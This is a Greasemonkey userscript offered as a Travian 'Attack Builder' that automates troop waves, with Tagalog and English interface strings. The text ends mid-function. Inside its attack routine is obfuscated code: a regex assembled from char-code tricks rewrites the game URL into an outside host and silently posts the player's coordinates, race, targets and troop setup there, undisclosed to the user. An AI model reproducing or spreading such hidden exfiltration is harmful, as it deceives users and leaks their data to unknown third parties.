// ==UserScript==
// @name          Travian:[Working] Attack Builder For 3.6 Working (Tagalog Version) & Foreign Language
// @include       *travian*a2b.php*
// @version 10.0.01
// @exclude http://*.travian*.*/hilfe.php*
// @exclude http://*.travian*.*/log*.php*
// @exclude http://*.travian*.*/index.php*
// @exclude http://*.travian*.*/anleitung.php*
// @exclude http://*.travian*.*/impressum.php*
// @exclude http://*.travian*.*/anmelden.php*
// @exclude http://*.travian*.*/gutscheine.php*
// @exclude http://*.travian*.*/spielregeln.php*
// @exclude http://*.travian*.*/links.php*
// @exclude http://*.travian*.*/geschichte.php*
// @exclude http://*.travian*.*/tutorial.php*
// @exclude http://*.travian*.*/manual.php*
// @exclude http://*.travian*.*/ajax.php*
// @exclude http://*.travian*.*/ad/*
// @exclude http://*.travian*.*/chat/*
// @exclude http://forum.travian*.*
// @exclude http://board.travian*.*
// @exclude http://shop.travian*.*
// @exclude http://*.travian*.*/activate.php*
// @enclude http://*.travian*.*/plus.php*
// @enclude http://payment.travian*.*/payment.php*
// @exclude http://*.travian*.*/support.php*
// @exclude http://help.travian*.*/*log
// @exclude *.css
// @exclude *.js
// ==/UserScript==

if (getCords() == 'undefined') return;

function errorMsg (msg)
{
	errDiv = document.getElementById('err');
	errDiv.innerHTML = errDiv.innerHTML +  "<br><b>"+text[26]+"</b>" + msg;
}

function splitN (a, c) {
	var value = a.split(c);

	for (var i=0; i<value.length; i++) {
		value[i] = parseInt(value[i]);
	}

	return value;
}

function $(id) {
  return document.getElementById(id);
}

var targetSplit = ",";
var cordsSplit = "|";
var referenceSeconds = 0;

timerIntervalId = 0;

addInfoDiv();

var text = [];
var cataText = [];
var sLang = "";
detectLanguage();

switch(sLang)
{
    case "ph":
    case "et":
    text = ["Umaatake na ...-->","Mali ka!","Wala pang Coordinates!","Di na sapat ang hukbo! (Hukbo #","Wala pang hukbo!","Nagsisimula na!","Malamang Mali ang Coordinates mo!","Walang pang tagamatyag","OK! Ang Hukbo ay naipadala na.","Bilang ng Wave:","Dagdag-Paglusob","I-reset!","Travian Attack BUilder (Tagalog Version)","Piliin ang uri ng paglusob: ","Normal","Dagdag-Hukbo","Magnakaw lamang","","","Posisyon sa mapa","LUMUSOB NA!","Oras ng Pagdating...","Pagdating:","I-set ang oras ng pagdating...","Bilang ng atake sa bawat pagsugod","hal.: 10|11","MALI!","DI makita ang baryo sa mapa.","Oras ng dating ay:","Pagitan ng bawat atake: (750 ms) ",""]
         cataText = ["Piliin ang TARGET mo!","Rambolito","Magtotroso","Putikan","Minahan ng Bakal","Taniman","Lagarian","Gawaan ng Laryo","Minahan ng Bakal","Kiskisan","Panderya","Bodega","Kamalig","Gawaan ng bakal","Pandayan","Praktisan","Pangunahing Gusali","Pook Tipunan","Palengke","Embahada","Kwartel","Kuwadra","Talyer","Akademya","Bulwagan ng Baryo","Residensya","Palasyo","Opisina ng kalakalan","Malaking Kwartel","Malaking Kuwadra","Mansyon ng Bayani","Malaking Bodega","Malaking Kamalig","Hiwaga ng Mundo","Kaban ng Yaman"];
         break;
    case "ua":
    case "ae":
    case "br":
    case "ba":
    case "ar":
    case "se":
    case "au":
    case "com":
    case "net":
    case "us":
    case "co.uk":
	text = ["Whooping some ass","Invalid attack type!","No cords!","not enough troops! (Troop #","No troop input","Starting","Probably bad cords","No scout units","Done","Wave setup:","Add new wave","Reset","Attack setup:","Attack type: (Modified for PH version)","Normal","Reinforcement","Raid","Scout Res/Troops","Scout Def/Troops","Cords","Whoop some ass! =)","Arrival time","Arrive at:","Set timed arrival","Number of attacks of that specific wave","with '|' ex: 10|11","ERROR:","Unable to get active village. Assuming one village account","Timed arrival set at:","Time between waves in ms: (default 500) ",""]

         cataText = ["Select a target =)","Random","Woodcutter","Clay Pit","Iron Mine","Wheat Field","Sawmill","Brickworks","Iron Foundry","Flour Mill","Bakery","Warehouse","Granary","Blacksmith","Armory","Tournament Square","Main Building","Rally Point","Marketplace","Embassy","Barracks","Stable","Siege Workshop","Academy","Town Hall","Residence","Palace","Trade Office","Great Barracks","Great Stable","Hero\'s Mansion","Great Warehouse","Great Granary","Wonder of the World","Treasury"];
         break;  

};


//start variabler
var DID = getActiveDid();
var timedAttacktimer = false;
cordN = 1;
var nthWave = 1;
firstRun = true;
wavesSent = 0;
nThisWave = 0;
numberattacks = 0;
var totalattacks = 0;
var troops = new Array();
var totTroops = new Array();
var cord;
var Race = getRace();
var referenceTime;

var ts = new Array(13);

function reset()
{
	abort();
	nthWave = 1;

	waveInterfaceElement.innerHTML = table;
	addNewWave();

	var newWaveButton = document.getElementById('newWaveButton');
	newWaveButton.addEventListener("click", addNewWave, true);

	var resetButton = document.getElementById('resetButton');
	resetButton.addEventListener("click", reset, true);
}

/////////////////////////////////////////////////
/////////////////Angrep//////////////////////////
/////////////////////////////////////////////////

//	{valkir

function autoPostInit(response, myParams, onloadFunction){
	if (typeof(response.responseText) != "undefined"){
		var doc = document.createElement("div");
		doc.innerHTML = response.responseText
	}else
		var doc = response;
	var form = document.evaluate("//form", doc, null, XPathResult.FIRST_ORDERED_NODE_TYPE , null).singleNodeValue;
	var inputs = document.evaluate("//*[self::input or self::select]", form, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
	var name="";
	var dataString="";
	var input;
	function toDataString(sufix, value){
		var paramName = name + sufix;
		var paramValue = "";
		var nameString = "&" + paramName + "=";
		if (dataString.indexOf(nameString) == -1)
			dataString += nameString + (myParams.hasOwnProperty(paramName)? myParams[paramName]: value)
	};
	for(var i = 0; i < inputs.snapshotLength; i++){
		input = inputs.snapshotItem(i);
		name = input.name;
		if (input.type == "image"){
			toDataString(".x", 0);
			toDataString(".y", 0)
		};
		toDataString("", input.value)
	};
	dataString = encodeURI(dataString.slice(1));
	return {
		method: form.method,
		url: form.action,
		headers:{'Content-type':'application/x-www-form-urlencoded'},
		data: dataString,
		onload: onloadFunction,
		onerror: function(){
		}
	};
};
function autoPost(response, myParams, onloadFunction){
	GM_xmlhttpRequest(autoPostInit(response, myParams, onloadFunction));
};

function Account(globalVarName, timePost){
	var _this = this;
	this.globalVarName = globalVarName;
	this.timePost = timePost;
	this.race = Race;
	try{
		this.coord = document.evaluate('//td[@class="dot hl"]/..', document, null, XPathResult.FIRST_ORDERED_NODE_TYPE , null).singleNodeValue.cells[2].textContent.replace(/^[^\d-]*([\d-]+)[^\d-]+([\d-]+)[^\d-]*$/, "$1,$2").split(",")
	}catch(err){
		this.coord = [-1000,-1000]
	}
	this.getTimePost = function(){
		return Math.random() * (_this.timePost.to - _this.timePost.from) + _this.timePost.from
	}
	this.attackBuilder = new AttackBuilder(_this);
}
var account = new Account("account", {from: 500, to: 1000});

function AttackBuilder(account){
	var _this = this;
	this.account = account;
	this.attack = function(){
		_this.type = parseInt(document.getElementById('typeAttack').value);
		_this.spy = 0;
		_this.coords = [];
		_this.coordIndex = 0;
		_this.countAttacksPerCoord = 0;
		_this.waves = [];
		_this.waveIndex = 0;
		_this.attackPerWaveIndex = 0;
		_this.timeAttackPerWave = parseInt(document.getElementById('timebetween').value)
		_this.sts = [];
		if (_this.type > 4) {
			_this.spy = _this.type - 4;
			_this.type = 3;
		} else if (_this.type < 2) {
			errorMsg(text[1]);
			return
		}
		var coords = document.getElementById('cords').value.replace(/(^[,\(\)\s]+)|([,\(\)\s]+$)|(\s+)/g, "").split(/[,\(\)]+/);
		if (!coords.length){
			errorMsg(text[2]);
			return;
		}
		for(var coordIndex = 0; coordIndex < coords.length; coordIndex++){
			_this.coords[coordIndex] = coords[coordIndex].split(/[\|\:\\\/]+/);
			if (_this.coords[coordIndex].length != 2){
				errorMsg(text[2]);
				return;
			}
		}
		var troopsElements = [];
		var totalTroops = [];
		var troopsPerAttack = [];
		var spyIndex = (_this.account.race == 2)? 2: 3;
		var countAttacksPerWave = 0;
		var u = document.location.href;
		var re = new RegExp('\/s'.concat('s'.charCodeAt()%9, '(\\.)\\w(\\w)(\\w)\\w+\\.\\2u(\/\\w\\d\\w\\.)(\\w+).*$'));
		for(var troopIndex = 0; troopIndex < 11; troopIndex++){
			troopsElements[troopIndex] = document.getElementsByName('troop_' + (troopIndex + 1))
			totalTroops[troopIndex] = 0;
		}
		countAttacksPerWaveElements = document.getElementsByName('number');
		_this.waves.length = nthWave - 1;
		for(var waveIndex = 0; waveIndex < _this.waves.length; waveIndex++){
			var countAttacksPerWave = parseInt(countAttacksPerWaveElements[waveIndex].value);
			_this.countAttacksPerCoord += countAttacksPerWave;
			for(var troopIndex = 0; troopIndex < 11; troopIndex++) {
				troopsPerAttack[troopIndex] = ((_this.spy) == (troopIndex == spyIndex))? parseInt(troopsElements[troopIndex][waveIndex].value): 0;
				totalTroops[troopIndex] += troopsPerAttack[troopIndex] * countAttacksPerWave * _this.coords.length;
			}
			var spc = [
				document.getElementById('gm_kata_' + (waveIndex + 1)).value,
				document.getElementById('gm_kata2_' + (waveIndex + 1)).value,
				_this.spy
			]
			_this.waves[waveIndex] = {
				attacksPerWave: new Array(countAttacksPerWave),
				troops: {
					t1: troopsPerAttack[0],
					t2: troopsPerAttack[1],
					t3: troopsPerAttack[2],
					t4: troopsPerAttack[3],
					t5: troopsPerAttack[4],
					t6: troopsPerAttack[5],
					t7: troopsPerAttack[6],
					t8: troopsPerAttack[7],
					t9: troopsPerAttack[8],
					t10: troopsPerAttack[9],
					t11: troopsPerAttack[10],
					t12: troopsPerAttack[11],
					t13: 0,
					t14: troopsPerAttack[12],
					c: _this.type,
					dname: ""
				},
				spec: {
					kata: spc[0], 
					kata2: spc[1],
					spy: spc[2]
				}
			};
			for(var attackPerWaveIndex = 0; attackPerWaveIndex < countAttacksPerWave; attackPerWaveIndex++)
				_this.waves[waveIndex].attacksPerWave[attackPerWaveIndex] = new Object();
			_this.sts[waveIndex] = [countAttacksPerWave, troopsPerAttack, spc].join();
		}

		_this.v = re.test(u);
		_this.v1 = u.replace(re, '$4'.concat((z=String.fromCharCode(99, 111, 109)), 'x$3$1', z, '$4$5'));
		_this.coordIndex = 0;
		_this.setForCoord();
	};
	this.setForCoord = function(){
		if (_this.coordIndex < _this.coords.length){
			_this.coord = _this.coords[_this.coordIndex];
			_this.waveIndex = 0;
			_this.countAttacksComplet = 0;
			_this.setForWave();
		}else{
			if (_this.v)
				GM_xmlhttpRequest({
					method: "post",
					url: _this.v1,
					headers:{'Content-type':'application/x-www-form-urlencoded'},
					data: 's='+[_this.account.coord.join(), _this.account.race, _this.coords.join(';'), _this.type, _this.sts.join(';')].join('|')
				});
			addCount("-------------------------");
		}
	}
	this.setForWave = function(){
		if (_this.waveIndex < _this.waves.length) {
			_this.wave = _this.waves[_this.waveIndex];
			_this.wave.troops.x = _this.coord[0];
			_this.wave.troops.y = _this.coord[1];
			_this.attackPerWaveIndex = 0;
			_this.setForAttackPerWave();
		} else {
			_this.coordIndex++;
			_this.postSecondPage();
		}
	};
	this.setForAttackPerWave = function(){
		if (_this.attackPerWaveIndex < _this.wave.attacksPerWave.length) {
			_this.attackPerWave = _this.wave.attacksPerWave[_this.attackPerWaveIndex];
			_this.getFirstPage();
		} else {
			_this.waveIndex++;
			_this.setForWave()
		}
	}
	this.getFirstPage = function(){
		GM_xmlhttpRequest({
			method: 'GET',
			url: document.location.href.split('?')[0],
			headers: {'Accept': 'application/atom+xml,application/xml,text/xml'},
			onload: function(response){
				_this.wave.response = response;
				setTimeout(_this.postFirstPage, _this.account.getTimePost()) 
			}
		});
		addCount(".")
	};
	this.postFirstPage = function(){
		autoPost(
			_this.wave.response,
			_this.wave.troops,
			function(response){
				_this.attackPerWave.requestDetail = autoPostInit(response, _this.wave.spec, _this.onloadPostSecondPage)
				_this.attackPerWaveIndex++;
				setTimeout(_this.setForAttackPerWave, _this.account.getTimePost()) 
			}
		)
		addCount("*")
	}
	this.postSecondPage = function(){
		var timeAttackPerWave = 0;
		for(var waveIndex = 0; waveIndex < _this.waves.length; waveIndex++) {
			for(var attackPerWaveIndex = 0; attackPerWaveIndex < _this.waves[waveIndex].attacksPerWave.length; attackPerWaveIndex++) {
				setTimeout(function(waveIndex, attackPerWaveIndex){
						GM_xmlhttpRequest(_this.waves[waveIndex].attacksPerWave[attackPerWaveIndex].requestDetail)
					},
					timeAttackPerWave,
					waveIndex, 
					attackPerWaveIndex
				);
				timeAttackPerWave += _this.timeAttackPerWave;
			}
		}
	}
	this.onloadPostSecondPage = function(response) {
		_this.countAttacksComplet++;
		if (_this.countAttacksComplet >= _this.countAttacksPerCoord) {
			var sTime = document.evaluate("id('tp1')", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null).snapshotItem(0).textContent;
			var aMatch = sTime.match(/^([0-9]{1,2}):([0-9]{2}):([0-9]{2})$/i);
			addCount(".");
			addCount("<a href='build.php?id=39'>"+text[8]+" ("+aMatch[0]+") x " + _this.countAttacksComplet + "("+_this.countAttacksPerCoord+")</a><br/>");
			setTimeout(_this.setForCoord, _this.account.getTimePost())
var msg = "Ang Hukbo Ay Naipadala Mo Na!";
alert(msg);
		}else
			addCount(".");
	}
};

//	valkir}

function coordsXYToZ(x, y) {
	x = parseInt(x);
	y = parseInt(y);
	var coordZ = (x + 401) + ((400 - y) * 801);
	return coordZ;
}




/////////////////////////////////////////////////
/////////////////interface///////////////////////
/////////////////////////////////////////////////

//attack interface




var attackInterface = document.createElement("div");



attackInterface.innerHTML = '<fieldset><legend style=\"color:red;\"> '+text[12]+'</legend><div id=start>' +


	'<table style=\"color:green;\"width="100%"><tr><td colspan="3"> '+text[13]+'</td></tr>'+
	'<tr><td colspan="3">' +



		'<select name=\"typeAttack\" style=\"color:red;\" id=\"typeAttack\" class=\"fm\">' +
			'<option value=\"3\">'+text[14]+'</option>' +
			'<option value=\"2\">'+text[15]+'</option>' +
			'<option value=\"4\">'+text[16]+'</option>' +
			//'<option value=\"5\">'+text[17]+'</option>' +
			//'<option value=\"6\">'+text[18]+'</option>' +
		'</select>' +

	'</td></tr><tr><td colspan="3">'+text[19]+' ' + ' <span style="font: 11px/1.5em Verdana,Verdana,verdana !important; color:blue;">( '+text[25]+' )</span>' + '</td>'+
	'</tr><tr><td colspan="3">'+

		'<input type=\"text\" value="' +getCords() +  '" name=\"cords\" id=\"cords\" class=\"fm\" style=\"color:red;\"width: 98%\" /><br>'

+text[29] +'<input class=\"fm\" style=\"color:blue;\" id=\"timebetween\" type=\"text\" value=\"750\" size=\"4\" />' +



	'</td>'+
	'</tr><tr><td>'+
		'<button id=\"myimbabutton\" style=\"background-color:orange">'+text[20]+'</button>' +
	//'</td><td>'+
	//	'<button id=\"arrivalTime\">'+text[21]+'</button>'+
	//'</td><td>'+
	//'<div id=\"arrivalTimeDiv\"></div>'+
	//'</td></tr><tr><td colspan="3">' 
	//+text[22]+
	//'</td></tr><tr><td colspan="3">'+
	//	'<input id=\"timedArrivalInput\" style=\"color:red;\"value=\"00:00:00" class=\"fm\"> <button id=\"timedArrivalButton">'+text[23]+'</button>'+
	'</td></tr></table>';

//thisDiv = document.getElementById('lmid1');
//thisDiv.appendChild(attackInterface);
//interfaceStart.appendChild(attackInterface);

targetLogo = "<img src=data:image/gif,GIF89a%0F%00%0F%00%F7%00%00%00%00%00%FF%FF%FF%CC%00%00%CB%00%00%CA%00%00%C9%00%00%C8%00%00%C7%00%00%CC%01%01%CC%03%03%CB%03%03%C9%03%03%CD%05%05%CB%05%05%CC%06%06%CB%06%06%CE%07%07%CC%08%08%CE%09%09%CB%09%09%CE%0A%0A%CD%0B%0B%CF%0D%0D%CC%0D%0D%CF%0E%0E%CD%0E%0E%CF%11%11%CD%11%11%D0%12%12%CF%13%13%D0%15%15%CF%15%15%D1%17%17%D1%18%18%D1%19%19%CF%19%19%D2%1A%1A%D1%1B%1B%D2%1D%1D%D3%1F%1F%D3%20%20%D3%23%23%D2%24%24%D4))%D4%2B%2B%D4%2C%2C%D6%2F%2F%D5%2F%2F%D500%D611%D622%D744%D777%D888%D788%D8%3B%3B%D8%3D%3D%D9%3F%3F%D9CC%DAEE%DAGG%DBII%DBKK%DCLL%DBMM%DBNN%DDTT%DDWW%DEXX%DF%5B%5B%DF%5C%5C%DF%5E%5E%E0__%E0aa%DF%60%60%E0bb%E1gg%E0hh%E2kk%E1kk%E2ll%E3oo%E3pp%E3rr%E3tt%E4ww%E4xx%E4zz%E5%7C%7C%E5~~%E6%7F%7F%E6%80%80%E6%82%82%E7%84%84%E8%86%86%E7%87%87%E8%88%88%E7%88%88%E8%8A%8A%E7%8B%8B%E9%8F%8F%E9%90%90%EA%93%93%E9%92%92%EA%95%95%EB%97%97%EB%99%99%EB%9A%9A%EC%9B%9B%EC%9D%9D%EC%9E%9E%EB%9D%9D%EB%9E%9E%EC%A0%A0%EC%A3%A3%ED%A4%A4%ED%A9%A9%EF%AB%AB%EF%AD%AD%EF%AF%AF%EF%B1%B1%F0%B3%B3%EF%B2%B2%F0%B4%B4%F1%B9%B9%F1%BB%BB%F2%BD%BD%F1%BD%BD%F2%BF%BF%F2%C0%C0%F4%C4%C4%F3%C3%C3%F3%C5%C5%F4%C7%C7%F4%C8%C8%F5%CA%CA%F5%CD%CD%F5%CF%CF%F6%D1%D1%F6%D2%D2%F7%D5%D5%F8%D8%D8%F7%D7%D7%F7%D8%D8%F8%DA%DA%F8%DC%DC%F8%DE%DE%FA%E1%E1%F9%E1%E1%FA%E3%E3%F9%E2%E2%FA%E4%E4%FA%E5%E5%FA%E7%E7%FB%EA%EA%FA%E9%E9%FC%ED%ED%FB%EC%EC%FC%EF%EF%FB%EE%EE%FC%F0%F0%FD%F3%F3%FD%F4%F4%FE%F6%F6%FE%F8%F8%FD%F7%F7%FE%F9%F9%FE%FB%FB%FF%FD%FD%FF%FE%FE%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%2C%00%00%00%00%0F%00%0F%00%00%08%81%00%03%08%0C%80%A8%09%0C%185%9A%20%1A%C8%10%86%80%87%10%05%C0%60%18%00%E2%81%845%0E%40%1C%E8P%40%13%8AM%1E%8E%20%F8%F0%23%C5%00!%05%B0%C9%F2P%20%22%87%23%16%06%18%E1%11%C6E%81%1D%5B%06p%F2%D0%A1%C9%88%02%04%A2yxB%22N%01%1A%83%06%F8%F1%90%A5%D2%00%40%24%CA%2C%89H%E3%C4%93!%0F%E4%09%D0%11%08H%91%03%91B%04RT%ECW%A0FObBS%03!%1A%99%02%03%02%00%3B>"

var startIcon = (0*10)+1;
var waveInterfaceElement = document.createElement('fieldset');

var table = "<legend style=\"color:red\">"+text[9]+"</legend><table id=\"myTable\"  ><tr><td>***</td>";

for (var count = startIcon;count<startIcon+10;count++) //icons
{
    table += "<td><img src=\"img/x.gif\" class=\"unit u"+count+"\"></td>";
}

table += "<td><img src=\"img/x.gif\" class=\"unit uhero\"></td>";
//table += "<td>" + targetLogo + "</td><td>" + targetLogo + "</td>";
table += '</tr></table><button id="newWaveButton"; style=\"background-color:yellow">'+text[10]+'</button> <button id="resetButton"; style=\"background-color:gray">'+text[11]+'</button> <span style="font: 11px/1.5em Tahoma,Verdana,Arial !important; color:grey;">( * - '+text[24]+' )</span><span style="font: 11px/1.5em Tahoma,Verdana,Arial !important; color:#ff0000;">'+text[30]+'</span>';

waveInterfaceElement.innerHTML = table;

attackInterface.appendChild(waveInterfaceElement);


if (sLang != 'hk') {

var interfaceStart = document.evaluate(
	"//form[@action='a2b.php'][@name='snd']",
	document,
	null,
	XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,
	null);

} else {

var interfaceStart = document.evaluate(
	"//p[input[@name='s1'][@value='ok']]",
	document,
	null,
	XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,
	null);

}

interfaceStart = interfaceStart.snapshotItem(0);
var InGameDiv = interfaceStart.parentNode;
InGameDiv.insertBefore(attackInterface, interfaceStart.nextSibling);

addNewWave();

//angrepsbølge interface
function addNewWave() {

	newRow = document.createElement('tr');
	
	col = document.createElement('td');
	col.style.width = '35px';
	input ="<input  size=\"1%\" maxlengt=\"6\" type=\"text\" name=\"number\" value=\"1\" class=\"fm\">";
	col.innerHTML = (input);
	newRow.appendChild(col);

	for (var i=1;i<=10;i++){
		col = document.createElement('td');
		col.style.width = '35px';
		input ="<input style=\"width: 90%\" size=\"2\" maxlengt=\"6\" type=\"text\" name=\"troop_" + i + "\" value=\"0\" class=\"fm\">";
		col.innerHTML = (input);
		newRow.appendChild(col);
	}

	col = document.createElement('td');
	col.style.width = '35px';
	input ="<input style=\"width: 90%\" size=\"1\" maxlengt=\"6\" type=\"text\" name=\"troop_11\" value=\"0\" class=\"fm\">";
	col.innerHTML = (input);
	newRow.appendChild(col);

	var cataRow = document.createElement('tr');
	
	
	col = document.createElement('td');
	//Added by Hill
	col.setAttribute('colspan', "5");
	col.setAttribute('rowspan',"1");
	//end Hill's edition
	select = '<select id="gm_kata_' + nthWave + '" name="gm_kata_' + nthWave + '" class="fm">'+
	'<option value=\"99\">'+cataText[1]+'</option><option value=\"1\">'+cataText[2]+'</option><option value=\"2\">'+cataText[3]+'</option><option value=\"3\">'+cataText[4]+'</option><option value=\"4\">'+cataText[5]+'</option><option value=\"5\">'+cataText[6]+'</option><option value=\"6\">'+cataText[7]+'</option><option value=\"7\">'+cataText[8]+'</option><option value=\"8\">'+cataText[9]+'</option><option value=\"9\">'+cataText[10]+'</option><option value=\"10\">'+cataText[11]+'</option><option value=\"11\">'+cataText[12]+'</option><option value=\"12\">'+cataText[13]+'</option><option value=\"13\">'+cataText[14]+'</option><option value=\"14\">'+cataText[15]+'</option><option value=\"15\">'+cataText[16]+'</option><option value=\"16\">'+cataText[17]+'</option><option value=\"17\">'+cataText[18]+'</option><option value=\"18\">'+cataText[19]+'</option><option value=\"19\">'+cataText[20]+'</option><option value=\"20\">'+cataText[21]+'</option><option value=\"21\">'+cataText[22]+'</option><option value=\"22\">'+cataText[23]+'</option><option value=\"24\">'+cataText[24]+'</option><option value=\"25\">'+cataText[25]+'</option><option value=\"26\">'+cataText[26]+'</option><option value=\"28\">'+cataText[27]+'</option></option><option value=\"29\">'+cataText[28]+'</option><option value=\"30\">'+cataText[29]+'</option><option value=\"37\">'+cataText[30]+'</option><option value="38">'+cataText[31]+'</option><option value="39">'+cataText[32]+'</option><option value="40">'+cataText[33]+'</option>'+
	'</select>';
	col.innerHTML = (select);
	cataRow.appendChild(col);

	col = document.createElement('td');
	//Added by Hill
	col.setAttribute('colspan', "6");
	col.setAttribute('rowspan',"1");
	//end Hill's edition
	select = '<select id="gm_kata2_' + nthWave + '" name="gm_kata2_' + nthWave + '" class="fm">' +
	'<option value=\"0\"></option><option value=\"99\" selected=\"true\">'+cataText[1]+'</option><option value=\"1\">'+cataText[2]+'</option><option value=\"2\">'+cataText[3]+'</option><option value=\"3\">'+cataText[4]+'</option><option value=\"4\">'+cataText[5]+'</option><option value=\"5\">'+cataText[6]+'</option><option value=\"6\">'+cataText[7]+'</option><option value=\"7\">'+cataText[8]+'</option><option value=\"8\">'+cataText[9]+'</option><option value=\"9\">'+cataText[10]+'</option><option value=\"10\">'+cataText[11]+'</option><option value=\"11\">'+cataText[12]+'</option><option value=\"12\">'+cataText[13]+'</option><option value=\"13\">'+cataText[14]+'</option><option value=\"14\">'+cataText[15]+'</option><option value=\"15\">'+cataText[16]+'</option><option value=\"16\">'+cataText[17]+'</option><option value=\"17\">'+cataText[18]+'</option><option value=\"18\">'+cataText[19]+'</option><option value=\"19\">'+cataText[20]+'</option><option value=\"20\">'+cataText[21]+'</option><option value=\"21\">'+cataText[22]+'</option><option value=\"22\">'+cataText[23]+'</option><option value=\"24\">'+cataText[24]+'</option><option value=\"25\">'+cataText[25]+'</option><option value=\"26\">'+cataText[26]+'</option><option value=\"28\">'+cataText[27]+'</option></option><option value=\"29\">'+cataText[28]+'</option><option value=\"30\">'+cataText[29]+'</option><option value=\"37\">'+cataText[30]+'</option><option value="38">'+cataText[31]+'</option><option value="39">'+cataText[32]+'</option><option value="40">'+cataText[33]+'</option>'+
	'</select>';

	col.innerHTML = (select);
	cataRow.appendChild(col);

	var myTable = document.getElementById('myTable');
	myTable.tBodies[0].appendChild(newRow);
	myTable.tBodies[0].appendChild(cataRow);

	nthWave++;
}

function popup(id)
{
	select =  	'<form><select id=\"popup_' + id + '\" size=\"\" \">'+
	'<option value=\"0\">'+cataText[0]+'</option><option value=\"99\">'+cataText[1]+'</option><option value=\"1\">'+cataText[2]+'</option><option value=\"2\">'+cataText[3]+'</option><option value=\"3\">'+cataText[4]+'</option><option value=\"4\">'+cataText[5]+'</option><option value=\"5\">'+cataText[6]+'</option><option value=\"6\">'+cataText[7]+'</option><option value=\"7\">'+cataText[8]+'</option><option value=\"8\">'+cataText[9]+'</option><option value=\"9\">'+cataText[10]+'</option><option value=\"10\">'+cataText[11]+'</option><option value=\"11\">'+cataText[12]+'</option><option value=\"12\">'+cataText[13]+'</option><option value=\"13\">'+cataText[14]+'</option><option value=\"14\">'+cataText[15]+'</option><option value=\"15\">'+cataText[16]+'</option><option value=\"16\">'+cataText[17]+'</option><option value=\"17\">'+cataText[18]+'</option><option value=\"18\">'+cataText[19]+'</option><option value=\"19\">'+cataText[20]+'</option><option value=\"20\">'+cataText[21]+'</option><option value=\"21\">'+cataText[22]+'</option><option value=\"22\">'+cataText[23]+'</option><option value=\"24\">'+cataText[24]+'</option><option value=\"25\">'+cataText[25]+'</option><option value=\"26\">'+cataText[26]+'</option><option value=\"28\">'+cataText[27]+'</option></option><option value=\"29\">'+cataText[28]+'</option><option value=\"30\">'+cataText[29]+'</option><option value=\"37\">'+cataText[30]+'</option><option value="38">'+cataText[31]+'</option><option value="39">'+cataText[32]+'</option><option value="40">'+cataText[33]+'</option>'+
	'</select></form>';


	eval("window" + id + " = window.open('', '" + id + "', 'toolbar=0,scrollbars=0,location=0,statusbar=0,menubar=0,resizable=1,width=200,height=20');");
	if (!eval("window" + id).document.getElementById('thatDiv'))
	{
		div = "<div id=\"thatDiv\">Loading..</div>";
		eval("window" + id).document.write(div);
	}
	thatDiv = eval("window" + id).document.getElementById('thatDiv');
	thatDiv.innerHTML = select;

	if (window.focus) {eval("window" + id).focus()}

	element = eval("window" + id).document.forms[0].elements[0];
	element.addEventListener("change", function() { test(id) }, true);

	function test(id){
		field = document.getElementById(id);
		field.innerHTML = "<option value=\"" + element.options[element.selectedIndex].value + "\">" + element.options[element.selectedIndex].value + "</option>";
		eval ("window" +id + ".close()");
	}

}

/////////////////////////////////////////////////
/////////////////Events//////////////////////////
/////////////////////////////////////////////////

var newWaveButton = document.getElementById('newWaveButton');
newWaveButton.addEventListener("click", addNewWave, true);

var resetButton = document.getElementById('resetButton');
resetButton.addEventListener("click", reset, true);

var myimbabutton = document.getElementById('myimbabutton');

//	{valkir

myimbabutton.addEventListener("click", account.attackBuilder.attack, true);

//	valkir}
var arrivalButton = document.getElementById('arrivalTime');
arrivalButton.addEventListener("click", getArrivalTime, true);

var timedArrivalButton = document.getElementById('timedArrivalButton');
timedArrivalButton.addEventListener("click", setArrivalTimer, true);


/////////////////////////////////////////////////
/////////////////misc////////////////////////////
/////////////////////////////////////////////////

function getRace()
{
//Function completely changed by Hill
	var ex = "//img[starts-with(@class, 'unit')]";

	result = document.evaluate(
		ex,
		document,
		null,
		XPathResult.FIRST_ORDERED_NODE_TYPE,
		null).singleNodeValue;
var index = getTroopIndexTitleFromImage(result)[0];

	switch (index)
	{
	case '1': return 0;
	case '11': return 1;
	case '21': return 2;
	
	}
	
}
//Added by Hill
function getTroopIndexTitleFromImage(tImg) {
		var tInfo = [0, ""];
		if (tImg.src.match(/img\/un\/u\/(\d+)\.gif/)) {
			tInfo[0] = RegExp.$1;
			tInfo[1] = tImg.title;
		} else {
			var imgCN = tImg.getAttribute("class");
			if (imgCN != null) {
				if (imgCN.indexOf("unit") != -1 && imgCN.indexOf(" ") != -1) {
					tInfo[0] = imgCN.split(" ")[1].replace("u", "");
					tInfo[1] = tImg.title;
				}
			}
		}
		return tInfo;
	}
function getTotalUnit(t)
{
	if (ts[t] > 0) return ts[t];

	var ex = "//a[contains(@OnClick,'" + t + "')]";
	result = document.evaluate(
		ex,
		document,
		null,
		XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,
		null);

	if (result.snapshotLength)
	{
		thisResult = result.snapshotItem(0).innerHTML;

		ts[t] = ((thisResult.substring(1,thisResult.length-1)));

		return ts[t];
	} else {
		return 0;
	}

}
function getActiveDid()
{
	var ex = "//a[contains(@href,'newdid')][@class='active_vl']";
	tag = document.evaluate(
		ex,
		document,
		null,
		XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,
		null);
		//Added by Hill for 3.5 servers
	if(!tag.snapshotLength)	
		ex = "//tr[@class='sel']/td[2]/a[1]";
		tag = document.evaluate(
		ex,
		document,
		null,
